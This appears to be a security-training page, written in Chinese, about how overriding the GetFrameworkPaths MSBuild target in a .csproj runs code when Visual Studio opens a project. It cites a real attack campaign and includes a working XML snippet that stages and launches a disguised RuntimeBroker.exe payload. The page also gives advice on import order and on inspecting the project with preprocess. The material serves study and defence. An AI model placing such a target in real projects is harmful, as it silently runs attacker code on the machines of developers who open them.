# Visual Studio 项目设计时 MSBuild 执行

{{#include ../banners/hacktricks-training.md}}

在 Visual Studio 中打开 C# 项目并非只是被动读取。其设计时构建会调用指定的 MSBuild targets，以初始化 IntelliSense、引用和调试功能，**早于**开发者选择“生成”或“运行”。`GetFrameworkPaths` 就是其中一个 target。重新定义该 target 的项目可以在加载项目时，以当前用户的上下文执行代码，无需单独点击载荷。<sup>[[1]](#references)[[2]](#references)</sup>

报告中的项目先声明了资源文件，随后在替代 target 中使用 `MakeDir`、`Copy` 和 `Exec` 来暂存并启动同目录下的载荷。下面的精简摘录保留了源文图 6 所示的执行路径；它应放在 `.csproj` 中，而不是独立的 XML 文件中。<sup>[[1]](#references)</sup>

```xml
<ItemGroup>
  <ResourceFiles Include="Resources\**\*.*" />
</ItemGroup>
<Target Name="GetFrameworkPaths">
  <MakeDir Directories="$(LocalAppData)\Microsoft\RuntimeBrokers" />
  <Copy SourceFiles="@(ResourceFiles)"
        DestinationFolder="$(LocalAppData)\Microsoft\RuntimeBrokers\%(RecursiveDir)"
        SkipUnchangedFiles="true" />
  <Exec Command='start "" "$(LocalAppData)\Microsoft\RuntimeBrokers\RuntimeBroker.exe"' />
</Target>
```

**导入顺序很重要：**MSBuild 使用 target 的*最后一个*定义。项目文件中编写的 target 不一定能替换 Microsoft 的 target，因为后续导入可能会重新定义它。使用 `<Project Sdk="...">` 的 SDK-style 项目会在项目正文之后隐式导入 SDK targets，因此应检查实际解析出的导入顺序，而不要假定此覆盖方式适用于所有项目。`MSBuild.exe -preprocess:expanded.xml project.csproj` 会展开导入内容但不构建项目，可帮助定位生效的 target 定义。<sup>[[3]](#references)[[4]](#references)</sup>

这是开发者项目的执行入口，不是 VSIX 扩展安装，也不会单独导致权限提升。如果暂存的可执行文件使用了恶意的相邻 `.exe.config` 或 DLL，请继续阅读 [AppDomainManager 劫持和 DLL sideloading](windows-local-privilege-escalation/dll-hijacking/)。

## References

- [1] [Unit 42 - Blinder Tunnel 活动针对伊拉克基础设施](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
- [2] [Microsoft Learn - Visual Studio 集成 (MSBuild)](https://learn.microsoft.com/en-us/visualstudio/msbuild/visual-studio-integration-msbuild?view=visualstudio)
- [3] [Microsoft Learn - MSBuild Targets](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets)
- [4] [Microsoft Learn - MSBuild 命令行参考](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-command-line-reference?view=visualstudio)
{{#include ../banners/hacktricks-training.md}}
